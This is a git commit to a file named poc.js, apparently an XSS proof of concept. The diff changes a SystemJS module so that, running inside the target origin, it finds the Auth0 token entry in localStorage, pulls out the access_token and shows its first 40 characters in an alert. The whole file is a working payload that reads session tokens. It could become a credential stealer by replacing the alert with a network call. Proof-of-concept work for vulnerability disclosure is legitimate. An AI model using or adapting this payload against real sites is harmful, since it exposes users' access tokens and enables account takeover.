8e9cfd8644108d504c1c3b49d503b78a901ff7c3
Habibullah Ahmadi <habahmadi05@outlook.com>
2026-06-09 14:54:51 +0100

    poc: show in-origin token read

--- poc.js
+++ poc.js
@@ -1,9 +1,14 @@
 System.register([], function () {
   return { execute: function () {
-    var k = Object.keys(localStorage).find(function (x) {
-      return /auth0/i.test(x) && /openid/i.test(x);
-    });
-    alert("XSS executing in origin: " + location.origin +
-          "\nReachable Auth0 token key: " + (k || "none"));
+    try {
+      var k = Object.keys(localStorage).find(function (x) {
+        return /auth0/i.test(x) && /openid/i.test(x);
+      });
+      var at = "(none)";
+      try { at = JSON.parse(localStorage.getItem(k)).body.access_token; } catch (e) {}
+      alert("XSS executing in origin: " + location.origin +
+            "\nAuth0 token key: " + (k || "none") +
+            "\naccess_token (first 40): " + String(at).slice(0, 40) + "…");
+    } catch (e) { alert("ran in " + location.origin + " | err: " + e); }
   }};
 });
